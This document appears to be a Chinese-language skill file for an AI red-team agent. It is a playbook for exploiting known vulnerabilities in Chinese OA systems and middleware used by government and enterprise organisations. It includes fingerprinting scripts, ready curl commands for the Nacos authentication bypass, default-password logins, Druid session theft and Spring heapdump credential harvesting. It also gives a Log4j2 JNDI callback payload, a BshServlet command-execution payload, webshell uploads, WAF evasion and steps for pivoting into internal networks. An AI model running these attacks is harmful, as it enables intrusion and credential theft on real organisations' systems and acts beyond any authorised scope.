---
name: cn-framework-nday
description: 国产 OA / 框架 / 中间件 Nday 打法索引：泛微、致远、通达、用友、金蝶、若依、JeecgBoot、Nacos、xxl-job、Druid、Actuator 的指纹、探测与利用顺序
whenToUse: 目标是中国政企/事业单位（大量国产 OA 与中间件），需要按"先查库、再指纹、后打点"的顺序快速拿入口
role: vuln-scan
enabled: true
---

# 国产 OA / 框架 Nday（先查现成的，再动手）

政企目标的入口**极少是自研漏洞**，绝大多数是这几类：**国产 OA 的未授权/上传**、**Java 框架反序列化**、
**中间件控制台未授权**、**默认口令**。这些都有现成 POC，**你的第一动作不是写脚本，是查知识库**。

## 〇、强制顺序

```text
redteam_poc_search(q=<组件名或 CVE>)   →  命中就直接 redteam_poc_get 拿正文照打
        ↓ 未命中
nuclei -u <url> -tags <组件>,<类型>      →  模板命中则用模板（-v 看请求）
        ↓ 仍未命中
按本技能手工指纹 + 探测
```

知识库（`knowledge.db`）里已内置国产框架/中间件的高频条目；`redteam_poc_search` 同时会带出
**本机 nuclei 模板库**的命中项（`templates` 字段），两边都空才手工打。

## 一、指纹（30 秒内判断打哪一类）

```bash
# 一批指纹一次打完：路径 + 标题 + favicon hash + 响应头
for p in / /login /admin /seeyon /wui /portal /ierp /U8 /nacos /druid/index.html /actuator; do
  printf '%-24s ' "$p"
  curl -sS -m 6 -o /dev/null -w '%{http_code} %{size_download}b ' "http://<target>$p"
  curl -sS -m 6 "http://<target>$p" | grep -oiE '<title>[^<]*</title>' | head -1
done
curl -sS -I 'http://<target>/favicon.ico' | head -5
```

| 特征 | 大概率是 | 首选打法 |
| --- | --- | --- |
| `/seeyon/`、`htmlofficeservlet`、`webmail` | 致远 OA（A6/A8/G6） | htmlofficeservlet 文件写入 / ajaxAction 注入 |
| `/wui/`、`/weaver/`、`/build/`、e-bridge | 泛微（e-cology / e-office / e-bridge） | SQL 注入 / 未授权上传 |
| `/general/`、`/ispirit/`、`/module/` | 通达 OA | 未授权访问 + 任意文件上传 |
| `/ierp/`、`/nc/`、`bsh.servlet.BshServlet` | 用友 NC / U8 / GRP | BshServlet 命令执行 |
| `/k3cloud/`、`/K3Cloud/` | 金蝶 | 反序列化 / SSRF |
| `ruoyi`、`/prod-api/`、`/druid/` | 若依（RuoYi） | Druid 未授权、`/actuator` 暴露 |
| `/jeecg-boot/`、`/sys/`、`jmreport` | JeecgBoot | 未授权 SQL / 模板注入 |
| `/nacos/`、`8848` | Nacos | 认证绕过（CVE-2021-29441） |
| `/xxl-job-admin/` | xxl-job | 默认口令 + GLUE 任务命令执行 |
| `/druid/index.html` | Alibaba Druid 监控 | 未授权读 session、CVE-2021-25646 |
| `/actuator/env`、`/actuator/heapdump` | Spring Boot | heapdump 捞密码、env 改写 |

> 拿不准时用 `nuclei -u <url> -tags tech,cn,oa -severity critical,high -v` 做一次技术栈确认，
> 再按上表选路。

## 二、Java 框架侧（命中率高、模板全）

按这个顺序试，**每一类先查知识库里的 `code`**（`thinkphp-*`、`shiro-550`、`fastjson-*`、`log4j2-*`、
`weblogic-14882`、`spring-22965`…）：

1. **Shiro**：任意请求带 `rememberMe=1`，看响应有没有 `Set-Cookie: rememberMe=deleteMe`
   → 有就是 Shiro，直接上 key 爆破 + CB 链（知识库 `shiro-550`）；
2. **Fastjson**：所有 JSON 接口都发一次 `{"@type":"java.lang.AutoCloseable"` 探报错
   （报 `autoType is not support` 就是 fastjson，再按版本选 1.2.24 / 1.2.47 链）；
3. **Log4j2**：所有会写日志的输入点（UA、X-Forwarded-For、搜索词、用户名）塞
   `${jndi:ldap://<VPS>:1389/a}`，看 VPS 的 LDAP 有没有回连；
4. **Weblogic**：`/console/login/LoginForm.jsp` 存在 → 先试 CVE-2020-14882 未授权 console；
5. **Spring**：`/actuator` 可访问 → heapdump/env；Spring4Shell 看 JDK9+Tomcat 的 WAR 部署特征。

## 三、中间件控制台（未授权 = 直接拿数据/权限）

```bash
# Nacos 认证绕过：User-Agent 伪装成服务端即可读用户列表
curl -sS -H 'User-Agent: Nacos-Server' 'http://<target>:8848/nacos/v1/auth/users?pageNo=1&pageSize=20'
# 拿到用户名后尝试默认口令 nacos/nacos → 登录后台改配置（可能 RCE）
curl -sS -X POST 'http://<target>:8848/nacos/v1/auth/login' -d 'username=nacos&password=nacos'

# Druid 监控未授权：session 直接可读（可能含后台登录态）
curl -sS 'http://<target>/druid/index.html' | head -c 200
curl -sS 'http://<target>/druid/websession.html' | grep -oE '[A-Za-z0-9%]{40,}' | head

# Actuator heapdump：整站内存里捞数据库密码 / 会话 / 密钥
curl -sS -o runs/heap.hprof 'http://<target>/actuator/heapdump'
strings runs/heap.hprof | grep -iE 'password|jdbc:|secret|token' | head -30

# xxl-job：默认 admin/123456，登录后可建 GLUE(Shell) 任务执行命令
curl -sS -c runs/xxl.cookie -X POST 'http://<target>/xxl-job-admin/login' \
  -d 'userName=admin&password=123456'
```

## 四、国产 OA 打点顺序

1. **未授权访问**（最轻）：直接访问 `/seeyon/management/index.jsp`、`/wui/index.html`、
   `/general/…` 看能否免登录进后台或读到人员/组织架构 → 记 `unauthorized`。
2. **SQL 注入**（最稳）：泛微 e-bridge 的 `categoryid`、通达的 `general/document` 系列参数，
   用 `sqlmap -r runs/req.txt --batch --level 2 --risk 1`，先 `--dbs` 定量。
3. **任意文件上传/写入**（最值钱）：致远 `htmlofficeservlet`（DBSTEP 协议）、通达上传点、
   泛微 `weaver` 上传接口 → 传**冰蝎/哥斯拉马**并实测连接（技能 `webshell-toolkit`）。
4. **命令执行**：用友 `bsh.servlet.BshServlet`（`bsh.script=exec("id");`）、部分 OA 的
   `RCE` 路由（`/api/…/exec`）→ 先 `id`/`whoami` 再谈反弹（技能 `shell-handler`）。

> **每一类都要先在知识库确认 payload 形态**：国产 OA 的路径与参数随版本差异极大，
> 照抄别人的 POC 十有八九 404；知识库条目里写了"命中判定"，先判定再打。

## 五、纪律

1. **只读探测优先**：能 `GET /` 判定就不 `POST`；能读版本就不写文件。
2. **写文件类漏洞先确认可写目录**（OA 常见 `../upload`、`../webapps/ROOT`），别写系统目录。
3. **不要批量打**：一个 C 段里 20 台同款 OA，只打**一台验证 + 抽样两台**，其余记"同版本待验证"。
   全段跑 exp 会把业务打挂，也会暴露。
4. **国产 OA 常有 WAF**（长亭/安恒/云 WAF）：被拦就先确认拦截特征（响应码/页面），
   再考虑编码变形，不要连打十次同样的包。
5. **拿到 shell 后先进内网**（技能 `suo5-tunnel`），别在边界机上反复操作。

## 六、落库（强制）

1. 指纹结果落资产 `surface`：`redteam_asset_test`（`surface` = "致远 A8 / Tomcat 9 / Shiro 存在"）。
2. 每条命中：`redteam_vuln_add`（`title` 带 CVE 或 CNVD 编号，`target` 带端口，`evidence` 贴命中响应，
   `gained` 写实际拿到什么）。
3. POC 用完 `redteam_poc_use`（`used_on` 写目标），复用次数会参与排序；**自己改了 payload 就
   `redteam_poc_update` 回写正文**，下次别人不用再踩。
4. 新写法（知识库里没有的）→ `redteam_poc_add`（`source=manual`、`category` 选对、`verified=1`
   并写 `verified_note`）。
5. `redteam_chain_add` 每步留命令与回显摘要。
